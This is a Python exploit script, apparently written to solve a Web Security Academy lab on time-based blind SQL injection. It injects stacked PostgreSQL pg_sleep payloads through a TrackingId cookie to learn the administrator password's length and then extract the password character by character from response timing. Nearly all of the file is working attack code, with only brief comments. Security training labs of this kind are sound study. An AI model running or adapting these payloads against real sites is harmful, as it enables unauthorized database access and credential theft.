#Lab: Blind SQL injection with time delays and information retrieval

#Exploiting blind SQL injection by triggering time delays

#Triggering a database error when the injected SQL query is executed no longer causes any difference in the application's response, so the preceding technique of inducing conditional errors will not work

import requests,sys

requests.packages.urllib3.\
disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)



def sql_engine(payload,timeout):
	proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

	host="https://acbf1f581e46fc458087a81f009b00b4.web-security-academy.net/login"

	headers={'application': 'x-www-form-urlencoded',"Cookie": "TrackingId=%s ; session=3fn13C3DB2tXN9W6VjbqyhKcVSGfq6Rz" %payload}		
	data = {"csrf":"fpVxvy90wXVBRHLgl37jc9kDXMOeTVFP","username":"wiener","password":"peter"}

	r = requests.post(host,headers=headers,data=data, proxies=proxies,verify=False, timeout=timeout)

	return r.status_code

def check_pass_length():

	length=""
	for i in range(1,50):
		payload_pass_length="x'%%3bSELECT+CASE+WHEN+length(password)=%s+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users+where+username='administrator'--"%i
		
		try:
			req = sql_engine(payload_pass_length,5) # try to make a request with the timeout=5, if the request is made faster than 5, then it's true, 
													#otherwise it throws the exception which is True with the sqli query
		
		except Exception as e:
			length=i
			break
	print ("length of the password is %s" %length)

	return length


def get_pass():
	extracted = ""
	for i in range(1,21):
		payload_pass="x'%%3bSELECT+CASE+WHEN+ascii(substring(password,%s,1))=[CHAR]+THEN+pg_sleep(15)+ELSE+pg_sleep(0)+END+FROM+users+where+username='administrator'--"%i
		for j in range(32,126): #loop every possible character in the ASCII printable set
			payload =payload_pass.replace("[CHAR]",str(j))

			try:
				req = sql_engine(payload,10) #set to 10 because mutuleple results have returned to 5 seconds

			except Exception as e:
				try:
					req = sql_engine(payload,10) #double-check
				except Exception as e:		
					extracted += chr(j)
					extracted_char = chr(j)
					sys.stdout.write(extracted_char)
					sys.stdout.flush()
					break

	return extracted


if __name__ == "__main__":

	#sql_engine(payload)
  #check_pass_length()
	get_pass()

